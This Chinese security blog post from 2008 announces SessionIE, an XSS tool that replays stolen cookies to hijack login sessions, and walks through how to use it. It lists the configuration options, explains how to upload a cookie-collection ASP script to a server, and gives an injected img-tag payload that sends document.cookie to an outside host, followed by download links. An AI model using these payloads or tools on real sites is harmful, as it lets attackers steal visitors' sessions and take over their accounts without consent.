---
title: SessionIE 正式版 下载
description: 这2天公布的好工具不少，昨天夜火我发了一个WScanv3.0-CRST红狼小组的web扫描器，今天又来一个SessionIE正式版，天天有新工具耍就爽了SessionIE公开正式版，并停止更新。一、什么是SessionIESessionIE是由CCTEAM开发团队开发的通用XSS辅助工具，可利用获取的COOKIE复制相同的http会话到本地以实现直接登录。
date: 2008-07-25 10:23:40
category: 安全工具
tags: ['SessionIE', 'session', 'Cookies']
post_id: 552
alias: SessionIE
ViewNums: 3923
---

这2天公布的好[工具](/tags/%E5%B7%A5%E5%85%B7%E5%85%B1%E4%BA%AB)不少，昨天[夜火](/blog/)我发了一个[WScan v3.0 - CRST红狼小组的web扫描器](/blog/wscan-v30-crsthtml "wscan v30 - crst红狼小组的web扫描器")，今天又来一个**[SessionIE 正式版](/blog/sessionie**，天天有新工具耍就爽了

SessionIE公开正式版，并停止更新。

**一、什么是 [SessionIE](/tags/SessionIE)**

SessionIE是由CCTEAM开发团队开发的通用[XSS](/blog/xss-worm-defense-hibaidu)辅助工具，可利用获取的[COOKIE](/blog/cookies-injection-method-theory)复制相同的http会话到本地以实现直接登录。

**二、SessionIE能做什么**

* Sessionie可以快速的利用XSS，而无需构造伪页面或代码等繁琐却不能重用的劳力
* Sessionie能即时的跟踪目标来源并进行 Session维持而保持Session的有效性
* Sessionie能结合特定的WEB服务以短信，邮件方式即时通知用户最新上线主机

**三、功能特点**

1. 即时通知上线主机
2. 两种[COOKIE](/blog/cookie-injection-how-the)修改方式，允许将Cookie设置到外部的任意浏览器
3. 完善的导入导出功能

**四、界面与说明**

Sessionie为单一可执行程序，主界面如图
![SessionIE](http://pic.yupoo.com/sunlei/140915eb88f1/n9wkz449.jpg)
配置窗口
![SessionIE 正式版](http://pic.yupoo.com/sunlei/082485eb88f0/wmy9a11f.jpg)
运行模式

sessionie( 具备session复制功能)

普通ie(正常的IE功能)

使用Pcap

不勾选则使用API模式,

勾选则使用pcap模式，需要设置网卡,该模式可将session设置到外部浏览器

建议使用api模式，当api设置COOKIE失败时可选用pcap模式

维持间隔

维持session的频率 单位为秒

保存结果

可用于无人值守时，自动保存劫持到的html内容，默认保存到report目录下，每个url默认保存两份。

爬虫深度（功能未开放）

用于无人值守时，自动保存劫持到的html的内容，并基于此session进行爬虫搜索的深度值。

相同URL重复次数

来源地址和COOKIE相同可重复出现的记录数

COOKIE脚本地址

用于收集cookie的脚本文件地址

例如：http://www.cncert.net/xss/xssc.asp

密码

Xssc脚本的密码

例如: www.cncert.net

短信提示

网址：用于接收Post数据的地址

表单内容：提交到上面网址的 post数据

注：配置文件为sysconfig.dll ,请不要手动修改配置文件，发生不可修复的错误时，请尝试删除配置文件。

**五、如何使用SessionIE**

1.修改下载的xsscu.asp里面的密码为你要设置的密码后上传ASP服务器。

2.打开Sessionie的配置窗口，设置好 COOKIE服务器地址和密码，选中Sessionie

3.构造

<img src=http://www.cncert.net/xss/xssc.asp?+document.cookie>

或者<img src=http://www.cncert.net/xss/xsscu.asp?+escape(document.cookie)>

类似语句到目标页面

4.当对方（必须和本地SessionIE为不同的公网IP）访问你的[XSS](/tags/%E8%B7%A8%E7%AB%99)页面时候，SessionIE便会拾取到[COOKIE](/tags/Cookies)

**六、如何得到SessionIE**

[下载地址](/blog/download.asp?id=112
[演示地址](/blog/download.asp?id=112

